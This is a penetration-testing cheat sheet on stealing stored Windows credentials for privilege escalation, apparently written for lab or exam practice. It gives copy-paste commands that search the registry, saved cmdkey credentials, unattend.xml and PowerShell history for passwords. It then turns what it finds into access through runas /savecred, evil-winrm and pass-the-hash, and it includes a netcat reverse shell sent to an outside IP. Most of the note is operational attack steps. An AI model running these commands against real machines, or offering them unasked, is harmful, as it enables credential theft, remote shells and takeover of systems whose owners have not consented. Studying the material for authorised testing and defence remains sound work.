# 🪟 Windows Stored Credentials

> Windows scatters credentials across the **registry, saved credentials, unattend files, PowerShell history, and config files**. Any one can hand you an admin password or a `runas` foothold. High-value and easy to overlook.

Part of [[Windows Privilege Escalation]]. Related: [[Credential Attacks]] · [[SMB]]
> One command per block so you can copy-paste each individually.

---

## 🧠 THINK
- Hunt the usual stashes: **autologon registry**, **cmdkey/DPAPI saved creds**, **unattend.xml**, **PSReadline history**, **config files**.
- A saved cred → `runas /savecred`. A cleartext/base64 password → reuse + PtH ([[Credential Attacks]]).

## ⚡ HUNT (each block copy-pastes on its own)
Registry-wide search for "password":
```cmd
reg query HKLM /f password /t REG_SZ /s
```
Winlogon autologon (`DefaultPassword`/`DefaultUserName`):
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```
Saved credentials (then `runas /savecred`):
```cmd
cmdkey /list
```
Credential-bearing files on disk:
```cmd
dir /s /b *.config *unattend* *.xml *.kdbx 2>nul
```
Unattended-install answer file (base64 admin pw):
```cmd
type C:\Windows\Panther\Unattend.xml
```
PowerShell console history:
```cmd
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
PuTTY/WinSCP/VNC/registry sessions often store creds too — check with winPEAS.

## 💥 USE WHAT YOU FIND
Run as another user with a saved credential:
```cmd
runas /savecred /user:admin "cmd /c C:\Windows\Temp\nc.exe 10.10.14.5 443 -e cmd"
```
Cleartext/base64 admin password → reuse:
```bash
evil-winrm -i $IP -u admin -p '<found>'          # or PtH with -H
```
Base64 unattend password: decode it (`echo <b64> | base64 -d`) then reuse.

## 🔁 FOUND → NEXT
| FINDING | NEXT |
|---|---|
| Autologon `DefaultPassword` | reuse / `runas` / PtH |
| `cmdkey` saved cred | `runas /savecred` as that user |
| unattend.xml base64 pw | decode → reuse ([[Credential Attacks]]) |
| Password in PS history/config | reuse everywhere + PtH |
| Admin cred recovered | [[WinRM]]/[[SMB]] shell → [[Dumping Windows Hashes]] |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| No creds found manually | run **winPEAS** (checks DPAPI, browsers, PuTTY, WiFi, etc.) |
| `runas` needs interactive/UAC | use a reverse-shell command as the arg; try WinRM/SMB with the cred |
| Base64 gibberish | it may be UTF-16 — `echo <b64>\|base64 -d\|iconv -f utf-16` |
| Cred rejected | check format/local-vs-domain → [[Credentials Rejected]] |

## 📇 CHEAT SHEET
```cmd
reg query HKLM /f password /t REG_SZ /s
```
```cmd
cmdkey /list
```
```cmd
type C:\Windows\Panther\Unattend.xml
```
```cmd
runas /savecred /user:admin cmd
```
**Kill shot:** stored/autologon/unattend cred → reuse/`runas`/PtH → admin → [[Dumping Windows Hashes]].
